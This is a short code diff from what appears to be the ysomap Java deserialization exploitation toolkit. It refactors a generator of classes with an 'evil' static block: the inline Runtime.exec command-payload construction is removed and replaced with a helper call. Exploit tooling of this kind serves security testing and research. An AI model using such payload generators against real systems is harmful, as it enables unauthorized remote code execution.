@@ -3,6 +3,7 @@ package ysomap.bullets.objects;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
 import ysomap.core.util.ClassFiles;
+import ysomap.core.util.PayloadHelper;
 
 /**
  * @author wh1t3P1g
@@ -33,10 +34,7 @@ public class ClassWithEvilStaticBlock implements Bullet<byte[]> {
         if(body.startsWith("code:")){
             code = body.substring(5);
         }else{
-            code = "java.lang.Runtime.getRuntime().exec(\"" +
-                    body.replaceAll("\\\\","\\\\\\\\")
-                            .replaceAll("\"", "\\\"") +
-                    "\");";
+            code = PayloadHelper.makeRuntimeExecPayload(body);
         }
         return ClassFiles.makeClassWithStaticBlock(classname, code);
     }
